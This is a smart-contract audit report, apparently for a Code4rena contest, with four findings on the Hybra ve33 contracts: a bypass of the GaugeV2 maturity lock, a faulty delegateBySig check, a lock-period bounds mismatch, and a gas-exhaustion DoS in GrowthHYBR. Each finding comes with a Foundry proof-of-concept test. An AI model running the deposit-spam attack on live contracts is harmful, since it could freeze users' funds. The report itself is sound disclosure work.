# Finding-1-Med
# Title----> Uninitialized maturityTime allows immediate withdrawal, bypassing intended lockup in GaugeV2

---

## Root Cause

The `GaugeV2` contract includes a `maturity` mechanism meant to enforce a lock period on deposited tokens before withdrawal. However, the `maturityTime` mapping is never initialized or updated during deposits. Because Solidity mappings default to zero, the check in `GaugeV2::_withdraw()`

```solidity
require(block.timestamp >= maturityTime[msg.sender], "!MATURE");

```

always passes (block.timestamp >= 0 is always true).
As a result, users can withdraw their entire stake immediately after depositing, bypassing the intended lockup period.


---

## Impact

- Because the maturity time is never set, users can withdraw their tokens immediately after depositing.
This makes the time lock check meaningless and disables any delay that the protocol may have intended between deposit and withdrawal.
- If the protocol relies on that delay for its reward, voting, or emission logic, this flaw allows users to bypass it completely and could disrupt the system’s intended flow or fairness.

---

## POC Path

- Import GaugeV2 contract to reproduce the maturityTime lock bypass bug
- Deploy a new GaugeV2 instance using existing protocol contracts for reward token, bribes, and manager addresses.This simulates a fresh gauge in the production environment.
- Mint tokens to a user and approve them for deposit into the gauge.
- Deposit tokens into the gauge using `gauge.deposit(10 ether)`.
- Read maturityTime[user] the value is 0 because the contract never initializes or updates this mapping.
- Call `gauge.withdraw(10 ether)` immediately after deposit.
- Expected behavior: transaction should revert with !MATURE if maturityTime mapping was initalized.
- Actual behavior: transaction succeeds and tokens are returned to the user.

## POC

Paste this test in file location: ve33/test/C4PoC.t.sol
Runnable Command: forge test --match-test test_submissionValidity -vvvvv

```solidity

import {GaugeV2} from "../contracts/GaugeV2.sol";

    function test_submissionValidity() external {
        // Deploy fresh GaugeV2 instance
        GaugeV2 gauge = new GaugeV2(
            address(rewardHybr), // reward token
            address(rewardHybr), // rHYBR (dummy)
            address(votingEscrow), // VE
            address(hybr), // LP token
            address(gaugeManager), // distribution
            address(bribeFactoryV3), // internal bribe
            address(bribeFactoryV3), // external bribe
            false // not a pair gauge
        );

        address user = makeAddr("user");

        // Mint LP tokens to user
        vm.prank(address(minter));
        hybr.mint(user, 100 ether);

        vm.startPrank(user);
        hybr.approve(address(gauge), type(uint256).max);

        // Deposit
        gauge.deposit(10 ether);

        // maturityTime never set, should be 0
        uint256 maturity = gauge.maturityTime(user);
        console2.log("maturityTime[user] =", maturity);

        // Withdraw immediately
        // Expected behavior (if lock worked): revert with "!MATURE"
        // Actual: withdraw succeeds immediately
        gauge.withdraw(10 ether);

        console2.log("Withdraw succeeded instantly maturity lock is never enforced.");
        vm.stopPrank();
    }


```
---

## Mitigation

Initialize the user’s maturity time whenever tokens are deposited, so the withdrawal restriction functions as intended.
For example, in the _deposit() function:

```solidity

maturityTime[account] = block.timestamp + MATURE_DURATION;

```

`MATURE_DURATION` can be a constant or configurable parameter representing the desired lock period.

If the protocol does not require any locking behavior, remove the maturity time check entirely to avoid confusion and redundant code.

---
---


# Finding-2-Low
# Title----> VotingEscrow::delegateBySig() reverts for valid signatures when relayer == delegatee due to incorrect sender check

---

## Summary
The `VotingEscrow::delegateBySig()` function incorrectly validates `delegatee != msg.sender` instead of ensuring `delegatee != signatory`.
This breaks the core logic of signature based delegation because the relayer is not necessarily the same as the signer it could be any address, including the authorized delegatee themselves.

As a result, if the delegatee directly executes the signed message on chain (a valid and expected case), the call reverts even though the signature is legitimate and verified.
This violates the intended design of EIP-712 based delegation, where any valid signature from the signer must be executable by any caller, including the delegatee.

---

## Root Cause
The `VotingEscrow::delegateBySig()` checks:

```solidity
require(delegatee != msg.sender, "NA");
```
instead of comparing against the actual signatory (the address that signed the message).
This causes valid calls to revert when `msg.sender == delegatee`.

**Internal Pre-conditions:**
- A valid EIP-712 signature is produced off chain by a user.

**External Pre-conditions:**
- The delegatee (or an automated relayer) directly submits the transaction on chain using that signature.

---

## Impact

- This logic error prevents certain valid signature delegations from executing successfully.
- It breaks the core cryptographic guarantee that any valid EIP-712 signature from the signer should be executable by any sender.
- The feature’s security invariant (off-chain signed delegations are verifiable and trustless) is violated, reducing protocol correctness and interoperability with third party relayers or automated systems.

---

## POC Path
- User (Alice) signs a valid delegation to Bob using EIP-712.
- Bob submits `delegateBySig(bob, ...)` on chain.
- Since `msg.sender == delegatee`, the function reverts with "NA".
- Delegation never completes, even though the signature is valid.


## POC

Paste this test in ve33/test/C4PoC.t.sol
Runnable Command: forge test --match-test test_submissionValidity -vvvvv


```solidity
    function test_submissionValidity() external {
        // Setup users
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");

        // Mock signature data
        uint256 nonce = 0;
        uint256 expiry = block.timestamp + 1 days;
        bytes32 digest = keccak256(abi.encodePacked(bob, nonce, expiry));

        // Simulate Alice signing off chain
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, digest); // private key 1 = Alice

        // Bob relays it himself (msg.sender == delegatee)
        vm.startPrank(bob);

        // Expect revert due to `require(delegatee != msg.sender, "NA")`
        vm.expectRevert(bytes("NA"));
        votingEscrow.delegateBySig(bob, nonce, expiry, v, r, s);

        vm.stopPrank();
    }

```
---

## Mitigation
- Replace the incorrect check so the restriction applies to the signer, not the transaction sender.
- Move the validation after recovering the signatory from the signature, and update the condition as:

```solidity
- require(delegatee != msg.sender, "NA");
+ require(delegatee != signatory, "NA");

```

---
---

# Finding-3-Low
# Title----> Inconsistent Lock Period Range in GrowthHYBR 12-24h Documented vs 1-4h Enforced.

---

## Summary
- The GrowthHYBR contract claims the `transferLockPeriod` is configurable between 12 to 24 hours, but the actual implementation restricts it to 1 minutes to 4 hours `(MIN_LOCK_PERIOD = 1 minutes, MAX_LOCK_PERIOD = 240 minutes)`.
- This creates a configuration contradiction between the documented behavior and the enforced logic.
- If the protocol publicly commits to a 12-24h lockup (i.e to prevent dump timing or short term transfer loops), this bug invalidates that promise making it possible for users to move tokens much earlier than intended.
- Any attempt to set a value above 4 hours will always revert, regardless of the current `transferLockPeriod`, effectively making the 12-24h configuration range unreachable.

---

## Root Cause

The contradiction originated right here in the variable definitions of GrowthHYBR:

```solidity
// Lock period for new deposits (configurable between 12–24 hours)
uint256 public transferLockPeriod = 24 hours;
uint256 public constant MIN_LOCK_PERIOD = 1 minutes;
uint256 public constant MAX_LOCK_PERIOD = 240 minutes;

```

When the owner later tries to modify this variable using the `GrowthHYBR::setTransferLockPeriod()` the runtime enforces this line:

```solidity
require(_period >= MIN_LOCK_PERIOD && _period <= MAX_LOCK_PERIOD, "Invalid period");

```
So any call where  `_period < 1 minutes` and `_period > 240 minutes(4 Hours)` will revert with `Invalid Period`


---

## Impact

- The bug prevents the protocol from ever setting or maintaining the documented 12-24 hour global transfer lock period, effectively breaking the configuration mechanism that governs user transfer restrictions.
- This results in a permanent deviation from the intended economic design, allowing users to transfer or dump tokens far earlier than expected.
---

## POC Path

- Call `gHybr.transferLockPeriod()`.
- You’ll see the default value 86400 (24 hours).
- As the contract owner, attempt to update the lock period to 12 hours using: `gHybr.setTransferLockPeriod(12 hours);` transaction reverts with `Invalid period`.
- Similarly, attempt `gHybr.setTransferLockPeriod(24 hours);` reverts again with `Invalid period`.
- Calling `gHybr.transferLockPeriod()` now returns 7200 (2 hours).
- Confirms that only values ≤ 4 hours are accepted, even though the contract comment specifies 12-24 hours.

## POC

Paste this test in file location: ve33/test/C4PoC.t.sol
Runnable Command: forge test --match-test test_submissionValidity -vvvvv

```solidity

    function test_submissionValidity() external {

        // gHybr is already deployed in the testbed setup
        // Check initial transferLockPeriod
        uint256 currentPeriod = gHybr.transferLockPeriod();
        console.log("Current transferLockPeriod (default):", currentPeriod); // expect 86400 (24h)

        // trying to set 12h lock should revert
        vm.expectRevert("Invalid period");
        gHybr.setTransferLockPeriod(12 hours);

        // trying to set 24h lock should revert
        vm.expectRevert("Invalid period");
        gHybr.setTransferLockPeriod(24 hours);

        // setting within allowed range (2hours) should pass
        gHybr.setTransferLockPeriod(2 hours);
        assertEq(gHybr.transferLockPeriod(), 2 hours, "Lock period not updated");
    }

```
---

## Mitigation

Update the enforced bounds to match the intended 12-24 hour configuration range:

```solidity
- uint256 public constant MAX_LOCK_PERIOD = 240 minutes;
+ uint256 public constant MAX_LOCK_PERIOD = 1440 minutes;
```

NOTE: Below part varies as intended/desired by protocol.
If the minimum lock period is intended to be 12 hours, update `MIN_LOCK_PERIOD` from 1 minutes to 12 hours as well otherwise this part can be ignored.

```solidity
- uint256 public constant MIN_LOCK_PERIOD = 1 minutes;
+ uint256 public constant MIN_LOCK_PERIOD = 720 minutes;
```
---
---

# Finding-4-Low
# Title----> Thousands of tiny Deposits by Attacker can Freeze user Withdrawals (Gas Exhaustion DoS in GrowthHYBR)

---

## Summary
- The `GrowthHYBR` contract allows anyone to deposit tokens on behalf of another user, creating a new `UserLock` entry for each deposit. Because there is no limit or aggregation on these entries, an attacker can spam thousands of tiny deposits to a victim’s address, massively inflating their userLocks array. 
- When the victim later tries to transfer or withdraw, the `_cleanExpired()` function must iterate and clear every expired entry, consuming unbounded gas. Once enough locks exist (~29k), a single transfer exceeds Ethereum’s ~45 M gas limit, causing every such transaction to revert. This effectively freezes the victim’s funds a gas exhaustion Denial of Service vulnerability.

---

## Root Cause

Lack of aggregation or cap in `userLocks` each deposit creates a separate lock entry, and `_cleanExpired()` performs an unbounded  O(n) iteration with multiple SSTORE operations during transfer/withdraw, leading to gas exhaustion as userLocks grows arbitrarily large.

---

## Impact

- Attackers can permanently freeze a victim’s HYBR tokens by creating thousands of tiny deposits to their address. Once enough userLocks accumulate, any transfer() or withdraw() by the victim exceeds the Ethereum block gas limit and always reverts. The victim’s funds become inaccessible on chain, effectively bricking their position until the protocol deploys a fix or forcibly unlocks funds through an emergency function.

---

## POC Path

- User call `gHybr.deposit(10000e18, user)` as the victim to create an initial gHYBR position.This ensures the victim holds a valid balance.
- As the attacker, call `hybr.approve(address(gHybr), type(uint256).max)` once to allow deposits.
- Perform 600 repeated calls to `gHybr.deposit(1, user)` from the attacker address.
- Before each call, increase the timestamp by one second using `vm.warp(block.timestamp + 1)` to ensure that every deposit      creates a distinct unlockTime and therefore does not merge with previous locks.
- In `gHybr.getUserLocks(user).length` you’ll see roughly 601 entries, confirming that each tiny deposit created a new lock entry.
- Advance time past the transfer lock period using `vm.warp(block.timestamp + gHybr.transferLockPeriod() + 10)` so all locks become expired and eligible for cleanup.
- Now, as the user, attempt to transfer tokens using `gHybr.transfer(user2, 1e18)`.
Observe the console output:
```yaml
  Gas used for transfer (N=601): 936450
  Approx gasPerLock: 1558
  Estimated gas for 29k locks: 45182000
```
- For 600 locks the transfer consumed ~936k gas (≈1558 gas/lock). Extrapolating linearly gives ≈45.18M gas for ~29k locks, which exceeds the current Ethereum block gas limit (~45M), rendering the transfer unexecutable on chain.
- This demonstrates that an attacker can create enough small deposits to make the victim’s transfer or withdrawal functionally unexecutable on chain (out of gas), effectively freezing their funds.

## POC

Paste this test in file location: ve33/test/C4PoC.t.sol
Runnable Command: forge test --match-test test_submissionValidity -vvvvv

```solidity

    function test_submissionValidity() external {

        address attacker = makeAddr("attacker");
        address user = makeAddr("user");
        address user2 = makeAddr("user2");

        // mint via authorized minter
        vm.startPrank(address(minter));
        hybr.mint(attacker, 1_000_000e18);
        hybr.mint(user, 1_000_000e18);
        vm.stopPrank();

        // user initial deposit to get gHYBR shares
        vm.startPrank(user);
        hybr.approve(address(gHybr), type(uint256).max);
        gHybr.deposit(10000e18, user);
        vm.stopPrank();

        // attacker approves once
        vm.startPrank(attacker);
        hybr.approve(address(gHybr), type(uint256).max);

        // Create many distinct userLocks by warping time between deposits
        uint256 iterations = 600;
        for (uint256 i = 0; i < iterations; ++i) {
            // ensure distinct unlockTime so entries do NOT merge
            vm.warp(block.timestamp + 1);
            gHybr.deposit(1, user);
        }
        vm.stopPrank();

        uint256 lockCount = gHybr.getUserLocks(user).length;
        console.log("UserLocks length:", lockCount);
        assertGt(lockCount, iterations);

        // Fast forward past transferLockPeriod so entries are expired and will be cleaned
        vm.warp(block.timestamp + gHybr.transferLockPeriod() + 10);

        // Measure gas for a normal transfer
        vm.prank(user);
        uint256 gasBefore = gasleft();
        (bool ok,) = address(gHybr).call(abi.encodeWithSelector(gHybr.transfer.selector, user2, 1e18));
        uint256 gasAfter = gasleft();
        uint256 gasUsed = gasBefore - gasAfter;

        console.log("Gas used for transfer (N=", lockCount, "):", gasUsed);

        // compute per lock and extrapolate to 29k
        uint256 gasPerLock = gasUsed / lockCount;
        uint256 estimatedFor29k = gasPerLock * 29000;

        console.log("Approx gasPerLock:", gasPerLock);
        console.log("Estimated gas for 29k locks:", estimatedFor29k);

        // Result shows block level DoS (45M ~= realistic block limit)
    }

```
---

## Mitigation

- Minimum deposit:
Require a minimum HYBR amount to create a new lock entry (i.e 0.001 HYBR = 1e15).
Smaller deposits should either merge into the last lock or revert.
Configurable via onlyOwner.

- Maximum locks per user:
Cap userLocks[user].length to a reasonable number (i.e 200).
When the cap is reached, merge new deposits into the last lock or reject them.
Also configurable by the owner.

Together, these ensure bounded array growth and prevent gas-exhaustion DoS.

---
---

